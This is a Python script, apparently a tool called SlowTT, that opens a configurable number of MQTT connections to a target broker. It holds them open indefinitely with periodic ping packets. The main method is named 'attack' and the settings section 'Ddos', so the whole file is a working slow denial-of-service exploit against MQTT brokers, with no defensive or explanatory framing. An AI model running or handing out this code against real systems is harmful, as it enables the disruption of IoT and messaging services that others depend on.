import paho.mqtt.client as mqtt
import time
from configparser import ConfigParser


class SlowTT:
    def __init__(self, ip_address: str, port: int, keepalive: int, connections: int):
        self.ip_address = ip_address
        self.port = port
        self.keepalive = keepalive
        self.connections = connections
        self.refused_count = 0
        self.dropped_count = 0
        self.success_count = 0

    def on_connect(self, client, userdata, flags, rc):
        if rc == mqtt.CONNACK_REFUSED_SERVER_UNAVAILABLE or rc == mqtt.CONNACK_REFUSED_NOT_AUTHORIZED:
            self.refused_count += 1
            print(f"[Connection Refused] Client {client._client_id.decode()} - Total Refused: {self.refused_count}")
        elif rc == mqtt.CONNACK_ACCEPTED:
            self.success_count += 1
            print(f"[Connection Accepted] Client {client._client_id.decode()} - Total Success: {self.success_count}")

    def on_disconnect(self, client, userdata, rc):
        if rc != 0:  # Disconnected unexpectedly
            self.dropped_count += 1
            print(f"[Connection Dropped] Client {client._client_id.decode()} - Total Dropped: {self.dropped_count}")

    def attack(self):
        clients = []
        start_time = time.time()
        for i in range(self.connections):
            client_name = f"Client_No.{i + 1}"
            current_client = mqtt.Client(client_name, protocol=5)
            current_client.on_connect = self.on_connect
            current_client.on_disconnect = self.on_disconnect
            try:
                current_client.connect(self.ip_address, self.port, self.keepalive)
                clients.append(current_client)
            except Exception as e:
                self.refused_count += 1
                print(f"[Connection Refused on Attempt] Client {client_name} - Total Refused: {self.refused_count}")

        cost_time = time.time() - start_time
        print("Initial Connection Results: ", 
              f"Refused: {self.refused_count}, Dropped: {self.dropped_count}, Successful: {self.success_count}")

        while True:
            for client in clients:
                try:
                    client._send_pingreq()
                except Exception as e:
                    self.dropped_count += 1
                    clients.remove(client)
                    print(f"[Error in Ping] Client {client._client_id.decode()} - Total Dropped: {self.dropped_count}")
            time.sleep(self.keepalive - cost_time)


if __name__ == '__main__':
    config = ConfigParser()
    config.read("net.config")
    ip_address = config.get('Host', 'ip_address')
    port = config.getint('Host', 'port')
    keepalive = config.getint('Host', 'keepalive')
    connections = config.getint('Ddos', 'connections')
    slowtt = SlowTT(ip_address, port, keepalive, connections)
    slowtt.attack()
